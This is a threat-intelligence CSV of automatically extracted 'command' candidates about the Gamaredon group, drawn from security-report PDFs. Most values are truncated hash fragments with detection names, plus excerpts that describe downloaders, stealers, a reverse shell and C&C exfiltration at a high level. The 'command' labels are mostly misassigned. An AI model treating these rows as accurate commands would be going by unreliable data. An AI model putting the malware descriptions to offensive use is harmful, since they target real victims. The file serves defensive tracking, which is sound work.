schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:962795f9c8c01507e3be8bf40883599cc9e2551c3be138f4031b083f856c3159,observation--sha256:6ae1597f44ada4916bcb093700eaa6d8a67d2092e1eedd185c0d7efa377ca374,command,5. Prohibit the use of cmd and powershell programs in the,5. Prohibit the use of cmd and powershell programs in the,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,".bat, .js, etc.) , as well as prohibit the unpacking of such files by archivers. Additionally, disable all executable files from the %AppData% directory. 5. Prohibit the use of cmd and powershell programs in the information system with user rights. Disable the ability to r un any scripts (*script.exe) with the users’ rights . 6. Prohibit the automatic launch of programs with the operating system, as well as access to programs in the system registry. 7. Pay attention to all incoming e -mail, espe",
1.0.0,actor--gamaredon,artifact--sha256:328dbd8621a1f3e6894fbb9da73166fdf5cae108bbe2a29a84730c81f5618afd,observation--sha256:8ff3287477ec6e5fd90452b4da59b48bea67e0a63f481972d39b38d815038bad,command,54573C9C62D93E0570E0 N/A PowerShell/Pterodo.GA Downloader of PteroClone.,54573C9C62D93E0570E0 N/A PowerShell/Pterodo.GA Downloader of PteroClone,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:525bde956c9a5de97fd6e1c9c44951aabccf43c9f6929119b1bc2d0ec0ce9d5c,observation--sha256:68f43874b03003492ef6e5be2e667541c685317eaac607f80b8c9051710b192e,command,5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate,5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:14e1c9c765e7a85f65d0ec0bd7f5e5cc1ae940a1fa308f87824e29ecfb9084c7,observation--sha256:95ac0172b8ba9ba62290fd8858238df9249601cd89526663f2dd8e421ed00060,command,5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO,5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:c467575d7e2b7141a69410ffac8ae3a96289bba5f709572cc2651a47c5100776,observation--sha256:da0827fdab504ca79533a286404be7a2c256beeb1b625491696b1fc07a903723,command,5CFE3DC37750834F0990 N/A PowerShell/Pterodo.GH PteroPShell – PowerShell reverse,5CFE3DC37750834F0990 N/A PowerShell/Pterodo.GH PteroPShell – PowerShell reverse,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:e17a241d419e7cbd7f1750bde266390489c17396622e216e040e65d7abaefba7,observation--sha256:381864b99b00b46544cc6934620035b833be79fd56e97928f46be48f13ea6357,command,6575120B9EA65D0AEAEA N/A PowerShell/Pterodo.EG PteroSteal – credential stealer.,6575120B9EA65D0AEAEA N/A PowerShell/Pterodo.EG PteroSteal – credential stealer,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:df5038df852db1599407cc5894392bb09a5a3e15e3073962a075218bf0525f7a,observation--sha256:ba0fb62bdc10d132bea33690b104d8e942fe01b4b18f6bf8b4b6bbd009ccfd73,command,6649BA3DABE8A9671305 N/A PowerShell/Pterodo.FT PteroGram – steals data that belongs,6649BA3DABE8A9671305 N/A PowerShell/Pterodo.FT PteroGram – steals data that belongs,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:883b9b9a43d45b7a8c88b82a43b9c9d54d3620ab6728df738c91598c7a3bfb33,observation--sha256:9d297fd766ceae851b822c0c850e6fe2372c0f22fbaf96e26af8ee6effd2cab8,command,66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout.,66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:70462f6a54ab6543ca4a296ead3c1c49fbbb3a90a941e43f7c5b21ac65b60409,observation--sha256:142f533bb34bb6109e69a949c3b3d3fdc312fa17c27e2f134f2adc733cee379e,command,7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:a01e9972bdeb08e889bfd02d2def88853a4b323ed8d1fdb756fb867952acf2b0,observation--sha256:9fe381df59f734e9907b5e8bdbe1c5a5932dfa34f709e70a28e44b20f6724eb7,command,7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo,7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:7cb6ebe52b6713f9ef2c21d2a4a15f8a65ba909d40b487d030bf05cc697bba84,observation--sha256:318dfb6769003fa812b975016bdd8d301926d4f38731a21051b7a39bd3065761,command,867DBF76DFB1E130E93 N/A PowerShell/Pterodo.WY PteroPaste – downloader and USB,867DBF76DFB1E130E93 N/A PowerShell/Pterodo.WY PteroPaste – downloader and USB,candidate,2025-11-20T00:00:00Z,day,known,same-record,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances SHA -1 Filename Detection Description F718F25DCCF68BD7CB28A A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa der.Agent.LDD Downloader of PteroPSDoor. 09A22856890AB6AEF6311 CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell downloader. 0F952E6162BCC881F7F84 4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell downloader. 61B03FF9D84EB653F9F66 867DBF76DFB1E130E93 N/A PowerShell/Pt",
1.0.0,actor--gamaredon,artifact--sha256:ecbb70de7f2ccfe8c95502d386784255e2d043ae41c6152b4489c3ec6c0a1d1d,observation--sha256:4f1aaa460e69f17f7c63662b475193044e86c8bd88de93f828c0faf7086848a7,command,895D9F3225EFB1273DCC N/A PowerShell/Pterodo.WY PteroBox API variant.,895D9F3225EFB1273DCC N/A PowerShell/Pterodo.WY PteroBox API variant,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:7f18050c3877bfdeabf3915e43679ad0220f9ae25bf34a51b786d487dbc549d6,observation--sha256:6fe42a2d0d9dc280f71e9b4c836d1f949c4bbd2d20395b4eef5d1f17361fb542,command,89C9011FE181CE169A47 N/A PowerShell/Pterodo.BQ PteroScreen – screen capturing tool.,89C9011FE181CE169A47 N/A PowerShell/Pterodo.BQ PteroScreen – screen capturing tool,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:76d6d327b01888500617611b98c3d2adc368297d89da002f16e9fb3ce2a248b0,observation--sha256:872b23d6d4a3543ab5f135de106bd76f622911456c284009da4619b2dbc0bdb6,command,8A2261D8C8111D2D99276575120B9EA65D0AEAEA ) is a PowerShell infostealer that steals credentials,8A2261D8C8111D2D99276575120B9EA65D0AEAEA ) is a PowerShell infostealer that steals credentials,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:724f2579788634e1ebdfff3edac2f595a1136f4b1cd6ab00dc1b705c839afaa6,observation--sha256:8ce811ecb1d05bcc0e0587a720ecafed8820679ae083db1b8ff7b23593c788aa,command,8E7B1094891627B3C706 N/A PowerShell/Pterodo.QB,8E7B1094891627B3C706 N/A PowerShell/Pterodo.QB,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:57a105979a7a4562c70b598a57112cb5c77be2cc8469bbeace17324420c35d38,observation--sha256:9049307decff6a5189de6a596409f78886785f62e18899c9a7ce71381044feb1,command,8F5FE5AF7F0C2BF67F95 N/A PowerShell/Pterodo.GA Downloader of PteroPSDoor variant 2.,8F5FE5AF7F0C2BF67F95 N/A PowerShell/Pterodo.GA Downloader of PteroPSDoor variant 2,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:3b6fbfd34bec12867accfa86a72a900f91d543ff032ed55c0d74e852c88cd537,observation--sha256:8fad32657acdd63b7bff76e11877c774b204f8469d71262325864d758ca7283b,command,9184101185D368F2B6CE N/A PowerShell/Pterodo.GK Downloader of PteroSteal.,9184101185D368F2B6CE N/A PowerShell/Pterodo.GK Downloader of PteroSteal,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:41a88bf3029f6d0712ff222bba12e2b00d7537bd4c33112ce7125ad24cf4e576,observation--sha256:5ddc710c9f73f63461ea52f93893db9106e05c2d3849d0a4747b51fba35c9398,command,990689AC989B44A0A230 N/A PowerShell/Pterodo.UE PteroEffigy – downloads PowerShell,990689AC989B44A0A230 N/A PowerShell/Pterodo.UE PteroEffigy – downloads PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
